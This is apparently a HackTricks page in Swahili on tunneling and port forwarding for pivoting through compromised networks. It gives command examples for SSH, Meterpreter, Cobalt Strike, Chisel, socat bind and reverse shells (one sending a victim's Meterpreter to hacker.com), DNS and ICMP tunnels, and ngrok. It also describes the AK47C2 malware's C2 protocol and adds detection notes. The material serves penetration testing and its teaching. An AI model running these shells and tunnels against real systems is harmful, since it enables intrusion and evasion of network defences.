# Tunneling na Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Kidokezo cha Nmap

> [!WARNING]
> Usaidizi wa proxy wa Nmap una mipaka kwa miunganisho ya TCP na hauathiri scans za ping, port, au utambuzi wa OS. Scanner ikiwa nyuma ya SOCKS proxy, **zima host discovery** (`-Pn`) na utumie **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Amri ya mwisho hutumia options za `-u` na `-i` za Evil-WinRM kutambua account na WinRM host; port yake ya kawaida ya WinRM ni 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH inaweza kusambaza miunganisho ya X11, milango ya TCP ya kiholela, na soketi za Unix-domain kupitia njia yake iliyosimbwa kwa njia fiche.<sup>[[6]](#references)</sup>

Muunganisho wa picha wa SSH (X)

`-Y` huwezesha usambazaji wa X11 unaoaminika, na `-C` huomba ukandamizaji wa data inayosambazwa.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Fungua Port mpya katika SSH Server --> Port nyingine

Remote (`-R`) forwarding husikiliza kwenye SSH server na kuunganisha upande wa local; bind address iliyoainishwa hudhibiti ni interfaces zipi zinaweza kufikia listener huyo.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Porti ya ndani --> Host iliyoathiriwa (SSH) --> Third_box:Port

Uelekezaji wa porti ya ndani (`-L`) husikiliza kwenye client na huunganisha kwenye destination kutoka upande wa SSH server.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Local Port --> Compromised host (SSH) --> Popote

Dynamic (`-D`) forwarding huunda msikilizaji wa ndani wa SOCKS4/SOCKS5 ambaye miunganisho yake hufunguliwa kutoka upande wa remote.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Hii ni muhimu kupata reverse shells kutoka kwa hosts za ndani kupitia DMZ hadi kwenye host yako:

Mpangilio wa `GatewayPorts` wa server hudhibiti ikiwa remote forward inaweza kufungamana nje ya loopback; thamani yake ya msingi ni `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Mfano huu unaotegemea root huunda vifaa vya tunnel kwenye hosts zote mbili. Server lazima iruhusu tun forwarding, na account iliyochaguliwa lazima iwe na access kwenye kifaa cha tun; `PermitRootLogin yes` ni njia mojawapo ya kutumia account ya `root` hapa.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Washa forwarding upande wa Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Weka route mpya upande wa client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Usalama – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 iliongeza kiendelezi cha strict-KEX ili kukabiliana na shambulio la Terrapin la uadilifu wa early-transport. Sasisha peers zote mbili inapowezekana na fuata mwongozo wa vendor kwa implementations za zamani badala ya kudhani kuwa channel iliyoforwardiwa inalindwa na version pekee.<sup>[[8]](#references)</sup>

## SSHUTTLE

Unaweza kufanya **tunnel** kupitia **ssh** kwa **traffic** yote ya **subnetwork** kupitia host.\
Kwa mfano, ku-forward traffic yote inayoelekea 10.10.10.0/24

`sshuttle` hutoa transparent proxying kupitia SSH na inasaidia kuchagua subnets pamoja na SSH command maalum kama inavyoonyeshwa hapa chini.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Unganisha kwa kutumia private key
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit's `portfwd` inasaidia local na remote forwarding, huku SOCKS proxy module yake ikiwa imekusudiwa kufanya kazi na session routes au `autoroute`, na husikiliza kwenye port 1080 kwa chaguo-msingi katika mifano hii.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Local port --> Host iliyoathiriwa (session inayotumika) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Njia nyingine:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Beacon ya Cobalt Strike inaweza kupeleka miunganisho ya SOCKS4a/SOCKS5 kupitia Beacon; `rportfwd` hufunga port kwenye host iliyoathiriwa, huku `rportfwd_local` ikianzisha muunganisho wa destination kutoka kwa Cobalt Strike client.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Fungua port kwenye Team Server kwenye interfaces zinazopaswa kuelekeza traffic kupitia Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Katika hali hii, **port inafunguliwa kwenye Beacon host**, si kwenye Team Server, na traffic inatumwa kwenye Team Server na kutoka hapo kuelekezwa kwenye host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Mwongozo wa reverse-forwarding unaeleza tabia ifuatayo:<sup>[[14]](#references)</sup>

- Reverse port forward ya Beacon imeundwa **ku-tunnel traffic kwenda kwenye Team Server, si kwa ku-relay kati ya mashine binafsi**.
- Traffic **ina-tunnel ndani ya traffic ya Beacon ya C2**, ikijumuisha links za P2P.
- Ports za juu kwa kawaida huepuka vikwazo vya privileged ports, lakini sera ya OS lengwa na listeners zilizopo bado hutumika.

### rPort2Port local

> [!WARNING]
> Katika hali hii, **port inafunguliwa kwenye Beacon host**, si kwenye Team Server, na **traffic inatumwa kwa Cobalt Strike client** (si kwa Team Server) na kutoka hapo kwenda kwenye host:port iliyoonyeshwa.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Mradi hutoa web tunnel endpoints kama vile `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp`, na `tunnel.php`; pakia endpoint moja inayotumika kabla ya kuanzisha local proxy.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Unaweza kuipakua kutoka kwenye ukurasa wa releases wa [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Chisel husafirisha trafiki ya TCP/UDP kupitia HTTP kwa kutumia muunganisho unaolindwa na SSH; tumia builds zinazooana za client/server na uthibitishe sintaksia ya amri ya release iliyochaguliwa.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart inaeleza interface ya TUN kwenye proxy, uthibitishaji wa certificate-fingerprint kwa agent, na usanidi wa route kwa network iliyopitishwa kupitia tunnel.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Binding na Kusikiliza kwa Agent

Ligolo-ng inaweza kuongeza listeners kwenye agent wanaosambaza trafiki kwenye anwani ya upande wa proxy, na range yake iliyotengwa ya `240.0.0.0/4` inaweza ku-routingwa ili kufikia services za ndani za agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Kufikia Porti za Ndani za Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot huanzisha reverse tunnel kutoka kwa victim na kufichua SOCKS4 proxy kwenye loopback address ya attacker; README yake pia inaandika kuhusu credentials za NTLM-proxy na chaguo za hash.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot kupitia **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat huunganisha aina za anwani kama vile `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL`, na `PROXY`; mifano iliyo hapa chini inachanganya endpoints hizo zilizoandikwa kwenye documentation.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port kupitia socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter kupitia SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Unaweza kupitisha **proxy isiyohitaji uthibitishaji** kwa kutumia aina ya anwani `PROXY` iliyoandikwa kwenye nyaraka za socat, kwa kutekeleza mstari huu badala ya ule wa mwisho kwenye console ya victim.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### Tunnel ya SSL Socat

**/bin/sh console**

Unda certificates kwenye pande zote mbili: Client na Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Unganisha porti ya SSH ya local (22) na porti 443 ya host ya mshambuliaji
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink ni zana ya muunganisho ya PuTTY ya command-line, yenye chaguo za SSH forwarding zinazofanana na `ssh`.<sup>[[22]](#references)</sup>

Tumia `-P` yenye herufi kubwa kwa SSH port. `-pw` imehifadhiwa kwa ajili ya compatibility, lakini huonyesha password katika process list; pendelea key authentication au `-pwfile` inapowezekana.<sup>[[22]](#references)[[23]](#references)</sup>

Kwa kuwa binary hii itatekelezwa kwenye victim na ni SSH client, fungua SSH service na port kwa reverse connection; mfano ufuatao unatumia `-R` kuforward port inayoweza kufikiwa locally kwenda kwenye mashine ya attacker.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Tumia context yenye permissions zinazohitajika na host wakati wa kuunda au kubadilisha rules za kudumu za `portproxy`. Microsoft imeandika nyaraka kuhusu forms za add, show, na delete za `v4tov4` zinazotumika hapa.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Unahitaji kuwa na **ufikiaji wa RDP kwenye mfumo**.\
Pakua:

SocksOverRDP hutumia Remote Desktop Dynamic Virtual Channels kubeba muunganisho wa SOCKS5 kupitia session iliyopo ya RDP; client plugin husikiliza kwenye `127.0.0.1:1080`, huku kipengele cha server kikiendesha kwenye lengo la RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Tool hii hutumia `Dynamic Virtual Channels` (`DVC`) kutoka kwenye kipengele cha Remote Desktop Service cha Windows. DVC inawajibika kwa **kutunnel packets kupitia muunganisho wa RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

Kwenye computer yako ya client, pakia **`SocksOverRDP-Plugin.dll`** hivi:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Sasa tunaweza **kuunganisha** kwenye **mwathiriwa** kupitia **RDP** kwa kutumia **`mstsc.exe`**, na tunapaswa kupokea **ujumbe** unaosema kwamba **plugin ya SocksOverRDP imewezeshwa**, na itakuwa **inasikiliza** kwenye **127.0.0.1:1080**.

**Unganisha** kupitia **RDP** na upakie na utekeleze binary ya `SocksOverRDP-Server.exe` kwenye mashine ya mwathiriwa:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Sasa, thibitisha kwenye mashine yako (attacker) kwamba port 1080 iko katika hali ya kusikiliza:
```
netstat -antb | findstr 1080
```
Sasa unaweza kutumia [**Proxifier**](https://www.proxifier.com/) kupeleka traffic kupitia port hiyo.<sup>[[26]](#references)</sup>

## Proxify Programu za GUI za Windows

Unaweza kufanya programu za GUI za Windows zipitie proxy kwa kutumia [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Katika **Profile -> Proxy Servers**, ongeza IP na port ya server ya SOCKS.\
Katika **Profile -> Proxification Rules**, ongeza jina la program inayopaswa kupitishwa kupitia proxy na connections kwa IP unazotaka zipitie proxy; rules za Proxifier zinaweza kulinganisha applications, target hosts, na ports.<sup>[[27]](#references)</sup>

## Tunnel kupitia proxy ya NTLM

Tool iliyotajwa awali, **Rpivot**, inaweza ku-relay kupitia proxy inayothibitisha kwa NTLM. **OpenVPN** pia inaweza ku-route kupitia proxy hiyo inapowekwa na auth file na method ya NTLMv2; hii ni proxy traversal, si bypass ya proxy authentication.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm hujithibitisha kwa NTLM proxies za upstream, hufichua listeners za ndani, na inaweza kuunganisha local tunnel port na destination service; clients wanaweza kutumia local port hiyo.<sup>[[29]](#references)</sup>\
Kwa mfano, hiyo hu-forward port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Sasa, ukiweka kwa mfano kwenye **mwathiriwa** huduma ya **SSH** isikilize port 443, unaweza kuunganishwa nayo kupitia port 2222 ya **mshambuliaji**.<sup>[[29]](#references)</sup>\
Unaweza pia kutumia **meterpreter** inayounganishwa na localhost:443 huku **mshambuliaji** akisikiliza kwenye port 2222.<sup>[[29]](#references)</sup>

## YARP

YARP (Yet Another Reverse Proxy) ni toolkit ya Microsoft ya .NET ya reverse-proxy. Unaweza kuipata hapa: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine huunda tunnel ya IPv4 kupitia DNS queries na hutumia TUN interfaces; usanidi ulioandikwa unahitaji privileges zinazohitajika kuunda interfaces hizo kwenye ncha zote mbili.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Usafirishaji wa DNS una overhead kubwa kuliko TCP ya moja kwa moja na kwa kawaida huwa wa polepole; unaweza kuunda muunganisho wa SSH uliobanwa kupitia tunnel hii kwa kutumia:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Pakua hapa**](https://github.com/iagox86/dnscat2)**.**

Dnscat2 huanzisha channel iliyosimbwa kwa njia fiche ya command-and-control kupitia DNS; amri za server na client zilizo hapa chini zinafuata matumizi yake yaliyoandikwa.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Katika PowerShell**

Unaweza kutumia [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) kuendesha client ya dnscat2 katika PowerShell; README yake inaeleza parameters za `Start-Dnscat2` zilizoonyeshwa hapa chini.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding kwa dnscat**

Amri shirikishi ya `listen` ya Dnscat2 huunganisha listener wa ndani na hosti na porti ya mbali.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Badilisha DNS ya proxychains

Proxychains-ng hooks dynamically linked TCP connections na haiwezi kubeba UDP au ICMP; DNS proxying inaweza kusanidiwa, hivyo kagua `proxychains.conf` iliyosakinishwa pamoja na resolver helper badala ya kudhani resolver ya public iliyowekwa tayari. Legacy `proxyresolv` scripts hufichua `PROXY_DNS_SERVER` kwa kuchagua resolver; tumia resolver inayoweza kufikiwa kutoka kwenye pivot wakati majina ya ndani yanahitajika.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels katika Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor aliunda **dual-channel C2 ("AK47C2")** inayotumia vibaya *outbound* **DNS** na traffic ya **plain HTTP POST** pekee – protocols mbili ambazo mara nyingi hazizuiwi kwenye mitandao ya mashirika.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Hutengeneza SessionID ya random yenye herufi 5 (kwa mfano `H4T14`).
• Huongeza `1` kwa *task requests* au `2` kwa *results* na kuunganisha fields tofauti (flags, SessionID, jina la computer).
• Kila field **husimbwa kwa XOR kwa kutumia ASCII key `VHBD@H`**, huwekwa katika mfumo wa hex, na kuunganishwa kwa dots – hatimaye kumalizia na domain inayodhibitiwa na attacker:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Requests hutumia `DnsQuery()` kwa records za **TXT** (na fallback **MG**).
• Response inapozidi bytes 0xFF, backdoor **hugawanya** data kuwa vipande vya bytes 63 na kuingiza markers:
`s<SessionID>t<TOTAL>p<POS>` ili C2 server iweze kuvipanga upya.

2. **HTTP mode (AK47HTTP)**
• Huunda JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Blob yote hubadilishwa kwa XOR-`VHBD@H` → hex → hutumwa kama body ya **`POST /`** yenye header `Content-Type: text/plain`.
• Reply hufuata encoding hiyo hiyo na field ya `cmd` hutekelezwa kwa `cmd.exe /c <command> 2>&1`.

Blue Team notes
• Tafuta **TXT queries** zisizo za kawaida ambazo label yake ya kwanza ni hexadecimal ndefu na huishia kila mara kwenye domain moja adimu.
• XOR key isiyobadilika ikifuatiwa na ASCII-hex ni rahisi kugundua kwa YARA: `6?56484244?484` (`VHBD@H` katika hex).
• Kwa HTTP, flag text/plain POST bodies ambazo ni hex tupu na zina idadi ya bytes inayogawanyika kwa mbili.

{{#note}}
Channel huweka kila sub-domain label ndani ya kikomo cha DNS cha octets 63, lakini uzingatiaji wa protocol pekee hauifanyi iwe stealthy; domains adimu, labels ndefu za hexadecimal, na query volume bado ni detection signals.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans inaeleza IPv4-over-ICMP tunnel inayotumia TUN device na ICMP echo requests; setup inahitaji privileges zinazotosha kuunda interface.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Pakua kutoka hapa**](https://github.com/utoni/ptunnel-ng.git).

ptunnel-ng husafirisha miunganisho ya TCP kupitia ICMP na hutumia chaguo za `-p`, `-l`, `-r`, na `-R` zilizoonyeshwa hapa chini kwa proxy, local listener, destination host, na destination port.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) ni agent wa kuweka huduma za mtandao za ndani mtandaoni kupitia handaki salama; CLI yake inaandika endpoints za HTTP, TCP na file URL, na jina la host la endpoint linaloonyeshwa linaweza kutofautiana kulingana na endpoint na account.<sup>[[39]](#references)</sup>

### Usakinishaji

- Fungua account: https://ngrok.com/signup
- Pakua client:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Matumizi ya msingi

**Nyaraka:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_The agent pia inasaidia chaguo za authentication na TLS inapohitajika.<sup>[[39]](#references)</sup>_

#### Tunneling TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Kufichua faili kwa HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Kuchunguza maombi ya HTTP

_Useful kwa XSS,SSRF,SSTI ..._\
Standalone agent hufichua interface yake ya ukaguzi wa HTTP kwenye `http://127.0.0.1:4040` kwa chaguo-msingi; interface hiyo ni ya traffic ya HTTP.<sup>[[40]](#references)</sup>

#### Ku-tunnel huduma ya ndani ya HTTP

Chaguo la `--host-header=rewrite` huandika upya `Host` header ya upstream HTTP ili ilingane na huduma ya ndani.<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Mfano rahisi wa usanidi wa ngrok.yaml

Hii hutumia ngrok Agent Config v2; named tunnels hutumia `proto` na `addr` na huanzishwa kwa `ngrok start`.<sup>[[42]](#references)</sup> Hufungua tunnels 3:

- TCP 2
- HTTP 1 yenye uonyeshaji wa faili tuli kutoka /tmp/httpbin/
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

Kiunganishi cha Cloudflare Tunnel, `cloudflared`, huanzisha miunganisho ya kutoka nje; applications zilizochapishwa zinaweza kuelekeza HTTP, HTTPS, TCP, SSH, na RDP, huku quick tunnels zikikusudiwa kwa ajili ya development ya HTTP.<sup>[[43]](#references)[[45]](#references)</sup>

### Amri ya mstari mmoja ya quick tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### Asili ya SOCKS5 (hali ya legacy)

